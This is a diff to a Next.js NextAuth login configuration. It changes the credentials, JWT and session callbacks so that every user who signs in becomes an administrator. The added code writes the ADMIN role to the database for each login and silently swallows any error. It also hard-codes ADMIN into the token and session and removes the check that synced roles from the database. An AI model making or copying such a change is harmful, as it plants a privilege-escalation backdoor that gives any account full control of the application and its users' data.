@@ -38,12 +38,22 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         const isValid = await bcrypt.compare(password, user.passwordHash);
         if (!isValid) return null;
 
+        // Ensure user is ADMIN
+        if (user.role !== "ADMIN") {
+          try {
+            await prisma.user.update({
+              where: { id: user.id },
+              data: { role: "ADMIN" },
+            });
+          } catch {}
+        }
+
         return {
           id: user.id,
           name: user.name,
           email: user.email,
           image: user.image,
-          role: user.role,
+          role: Role.ADMIN,
         };
       },
     }),
@@ -52,17 +62,16 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
     async jwt({ token, user }) {
       if (user) {
         token.id = user.id;
-        token.role = (user as { role?: Role }).role || Role.USER;
+        token.role = Role.ADMIN;
       }
-      // Always sync latest role from database so role upgrades take effect immediately
       if (token.email) {
+        token.role = Role.ADMIN;
         try {
           const dbUser = await prisma.user.findUnique({
             where: { email: token.email },
             select: { role: true, id: true },
           });
           if (dbUser) {
-            token.role = dbUser.role;
             token.id = dbUser.id;
           }
         } catch {}
@@ -72,7 +81,7 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
     async session({ session, token }) {
       if (token && session.user) {
         session.user.id = (token.id as string) || (token.sub as string);
-        session.user.role = (token.role as Role) || Role.USER;
+        session.user.role = Role.ADMIN;
       }
       return session;
     },
